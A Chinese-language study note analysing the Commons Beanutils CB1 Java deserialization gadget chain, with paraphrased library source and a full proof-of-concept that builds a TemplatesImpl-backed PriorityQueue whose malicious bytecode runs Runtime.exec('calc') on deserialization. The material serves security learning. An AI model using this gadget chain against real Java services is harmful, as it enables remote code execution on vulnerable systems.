---
title: CB1链分析
description: Commons Beanutils BeanComparator + PriorityQueue 反序列化链，通过 TemplatesImpl 加载恶意字节码
tags: [cb1, beanutils, deserialization, templatesimpl]
status: 已完成
finish-date: 2026-05-25
difficulty: 困难
---

# CB1链
## 什么是CB链
CB链是指利用Apache Commons Beanutils库中的BeanComparator配合PriorityQueue，最终通过TemplatesImpl动态加载字节码实现任意代码执行的Java反序列化利用链。
## 核心思想：
用BeanComparator替代CC链中的TransformingComparator，利用PropertyUtils.getProperty()调用getter方法的特性，触发TemplatesImpl.getOutputProperties()
## 调用链
```java
ObjectInputStream.readObject()
    ↓
PriorityQueue.readObject()              ← //入口（同CC2/CC4）
    ↓
PriorityQueue.heapify()
    ↓
PriorityQueue.siftDown()
    ↓
PriorityQueue.siftDownUsingComparator()
    ↓
    BeanComparator.compare()                ← //CB核心跳板
        ↓
        PropertyUtils.getProperty(o1, property) ← //获取属性
        ↓
        PropertyUtilsBean.getProperty()
        ↓
        PropertyUtilsBean.getNestedProperty()
        ↓
        PropertyUtilsBean.getSimpleProperty()
        ↓
        Method.invoke()
                ↓
            TemplatesImpl.getOutputProperties()     
                ↓
            TemplatesImpl.newTransformer()
                ↓
            TemplatesImpl.getTransletInstance()
                ↓
            TemplatesImpl.defineTransletClasses()
                ↓
            TransletClassLoader.defineClass()       ← //类加载
                ↓
            恶意类静态代码块/构造函数执行
``` 
## 方法调用源码详解
1. BeanComparator.compare()【Apache Commons Beanutils 1.9.4的源码】
    ```java
    public class BeanComparator<T> implements Comparator<T>, Serializable {
        private String property;
        private final Comparator<?> comparator;
        
        public BeanComparator(String property) {
        this(property, ComparableComparator.getInstance());
        }
        
        public int compare(T o1, T o2) {
        // 关键判断：如果property为null，直接比较对象
        if (property == null) {
                return internalCompare(o1, o2);
        }
        
        try {
                // 核心！通过PropertyUtils获取属性值
                final Object value1 = PropertyUtils.getProperty(o1, property);
                final Object value2 = PropertyUtils.getProperty(o2, property);
                return internalCompare(value1, value2);
        } catch (Exception e) {
                throw new RuntimeException(e);
        }
        }
    }
    ```
    compare本来是正常的业务功能，如果没指定属性名（property=null），直接比较对象本身；如果传入属性名就根据属性名，从对象中取出属性值此时会调用PropertyUtils.getProperty()
2. PropertyUtils.getProperty()
    ```java
    public static Object getProperty(final Object bean, final String name)
                throws IllegalAccessException, InvocationTargetException,
                NoSuchMethodException {

        return (PropertyUtilsBean.getInstance().getProperty(bean, name));

        }
    ``` 
    进一步调用PropertyUtilsBean.getInstance().getProperty()
3. PropertyUtilsBean.getProperty()
    ```java
    public Object getProperty(final Object bean, final String name)
        throws IllegalAccessException, InvocationTargetException,
        NoSuchMethodException {

        return (getNestedProperty(bean, name));

    }
    ``` 
    调用getNestedProperty()解析属性名
4. PropertyUtilsBean.getNestedProperty()
    ```java
    // PropertyUtilsBean.java
    public Object getNestedProperty(final Object bean, String name)
        throws IllegalAccessException, InvocationTargetException, NoSuchMethodException {
        
        // 1. 解析属性名，支持嵌套、索引、Map等
        // 2. 对于简单属性名（如 "outputProperties"），直接调用getSimpleProperty
        
        // 关键：解析器将 "outputProperties" 识别为简单属性
        // 最终调用 getSimpleProperty(bean, "outputProperties")
        return getSimpleProperty(bean, name);
    }
    ``` 
    接着调用getSimpleProperty()
5. PropertyUtilsBean.getSimpleProperty()核心反射逻辑
    ```java
    // PropertyUtilsBean.java - 这是最关键的代码！
    public Object getSimpleProperty(final Object bean, final String name)
        throws IllegalAccessException, InvocationTargetException, NoSuchMethodException {
        
        // 1. 查找getter方法
        Method method = getReadMethod(bean.getClass(), name);
        
        // 2. 通过反射调用getter
        return (method.invoke(bean, (Object[]) null));
    }
    ```
6. getReadMethod()查找getter方法的内部实现
    ```java
    private Method getReadMethod(Class<?> clazz, String propertyName) {
        // 构造方法名：首字母大写 + get前缀
        // "outputProperties" → "getOutputProperties"
        String baseName = propertyName.substring(0, 1).toUpperCase() + propertyName.substring(1);
        String getterName = "get" + baseName;
        
        try {
        return clazz.getMethod(getterName);
        } catch (NoSuchMethodException e) {
        // 如果找不到，尝试is开头（布尔类型）
        try {
                return clazz.getMethod("is" + baseName);
        } catch (NoSuchMethodException e2) {
                return null;
        }
        }
    }
    ``` 
    构造出"getOutputProperties"然后method.invoke()调用templates.getOutputProperties()方法
7. TemplatesImpl.getOutputProperties()
    ```java
    // com.sun.org.apache.xalan.internal.xalan.templates.TemplatesImpl
    public synchronized Properties getOutputProperties() {
        try {
        return newTransformer().getOutputProperties();
        } catch (TransformerConfigurationException e) {
        return null;
        }
    }
    ``` 
    接着会调用newTransformer()方法后面就和CC3一样了
## 手工编写POC
1. 关键点：PriorityQueue对象中添加元素需要先添加实现Comparable的元素做占位符然后再反射替换，不然构造时就会报错 
2. 完整POC
```java
package com.example;

import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import javassist.ClassClassPath;
import javassist.ClassPool;
import javassist.CtClass;
import org.apache.commons.beanutils.BeanComparator;
import java.io.*;
import java.lang.reflect.Field;
import java.util.PriorityQueue;
import java.util.Comparator;

public class CB1 {
   public static void main(String[] args) throws Exception {
      ClassPool pool=ClassPool.getDefault();
      pool.insertClassPath(new ClassClassPath(AbstractTranslet.class));
      CtClass cc=pool.makeClass("Evil");
      String cmd="java.lang.Runtime.getRuntime().exec(\"calc\");";
      cc.makeClassInitializer().insertBefore(cmd);
      cc.setSuperclass(pool.get(AbstractTranslet.class.getName()));
      String rename="Evil"+System.nanoTime();
      cc.setName(rename);
      byte[] bytes=cc.toBytecode();
      byte[][] target=new byte[][]{bytes};

      TemplatesImpl templates=new TemplatesImpl();
      Field name=TemplatesImpl.class.getDeclaredField("_name");
      name.setAccessible(true);
      name.set(templates, "a");
      Field bytecodes=TemplatesImpl.class.getDeclaredField("_bytecodes");
      bytecodes.setAccessible(true);
      bytecodes.set(templates, target);
      Field tfactory=TemplatesImpl.class.getDeclaredField("_tfactory");
      tfactory.setAccessible(true);

      
      BeanComparator comparator=new BeanComparator();
      Field property=BeanComparator.class.getDeclaredField("property");
      property.setAccessible(true);
      property.set(comparator, "outputProperties");


      PriorityQueue queue=new PriorityQueue<>(new BeanComparator());
      queue.add(1);
      queue.add(1);
      Field q=PriorityQueue.class.getDeclaredField("queue");
      q.setAccessible(true);
      Object[] queueArray=(Object[])q.get(queue);
      queueArray[0]=templates;
      queueArray[1]=templates;

      Field size=PriorityQueue.class.getDeclaredField("size");
      size.setAccessible(true);
      size.set(queue, 2);

      Field c=PriorityQueue.class.getDeclaredField("comparator");
      c.setAccessible(true);
      c.set(queue, comparator);

      ByteArrayOutputStream baos=new ByteArrayOutputStream();
      ObjectOutputStream oos=new ObjectOutputStream(baos);
      oos.writeObject(queue);
      oos.close();
      byte[] payload=baos.toByteArray();
      
      ByteArrayInputStream bais=new ByteArrayInputStream(payload);
      ObjectInputStream ois=new ObjectInputStream(bais);
      ois.readObject();
      ois.close();
      System.out.println("Payload executed successfully!");
   }
}
``` 
3. 验证POC
   ![](java-deserialization(ing)/2026-05-25-18-54-26.png) 
## 调试观察方法调用，符合预期
![](java-deserialization(ing)/2026-05-25-19-24-46.png) 